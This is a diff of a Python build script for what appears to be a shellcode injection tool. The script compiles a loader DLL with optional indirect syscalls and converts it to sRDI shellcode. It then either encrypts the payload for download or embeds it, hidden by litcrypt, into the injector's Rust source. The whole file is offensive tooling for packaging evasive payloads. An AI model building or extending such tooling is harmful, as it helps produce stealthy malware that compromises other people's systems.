@@ -6,6 +6,8 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-p', '--path', type=str, required=False, help='Payload file path.')
 parser.add_argument('-l', '--use_loader', action='store_true', help='Use the Loader.')
 parser.add_argument('-i', '--use_syscalls', action='store_true', help='Force the Loader to use indirect syscalls.')
+parser.add_argument('-d', '--download', action='store_true', help='Prepare the payload to be downloaded by EPI.')
+
 
 args = parser.parse_args()
 final_payload = None
@@ -45,14 +47,28 @@ if args.use_loader is not False:
 		print("[x] Error building the Loader.")
 		exit()
 
-	ret = os.system('cmd /c "cd .\\sRDI && python3 ConvertToShellcode.py -f run ..\Loader\\target\\release\loader.dll"')
+	ret = os.system('cmd /c "cd .\\sRDI && python3 ConvertToShellcode.py -f run ..\\Loader\\target\\release\\loader.dll"')
 	if ret != 0:
-		ret = os.system('cmd /c "cd .\\sRDI && python ConvertToShellcode.py -f run ..\Loader\\target\\release\loader.dll"')
+		ret = os.system('cmd /c "cd .\\sRDI && python ConvertToShellcode.py -f run ..\\Loader\\target\\release\\loader.dll"')
 		if ret != 0:
 			print("[x] Error converting the Loader into sRDI.")
 			exit()
 
-	with open('.\\Loader\\target\\release\\loader.bin', 'rb') as f:
+	if args.download is not False:
+		key = os.environ['LITCRYPT_ENCRYPT_KEY'].replace('"','')
+		print("[-] Encrypting payload with key " + key)
+		command = 'cmd /c "cd .\\utils && encrypt.exe ..\\Loader\\target\\release\\loader.bin ' + key + '"'
+		ret = os.system(command)
+		if ret != 0:
+			print("[x] Error encrypting the payload.")
+		else:
+			print("[+] payload.bin successfully written to payload directory.")
+		
+		final_payload = ""
+	
+	else:
+
+		with open('.\\Loader\\target\\release\\loader.bin', 'rb') as f:
 			final_payload = f.read().hex()	
 
 else:
@@ -65,7 +81,7 @@ else:
 with open('EPI\\src\\main.rs', 'r') as file:
 	epi = file.readlines()
 
-epi[13] = '\tlet bytes = lc!("' + final_payload + '");\n'
+epi[12] = '\tlet mut bytes = lc!("' + final_payload + '");\n'
 
 with open('EPI\\src\\main.rs', 'w') as file:
 	file.writelines(epi)
@@ -77,3 +93,4 @@ if ret != 0:
 	exit()
 
 print("[+] Build successfully completed.")
+
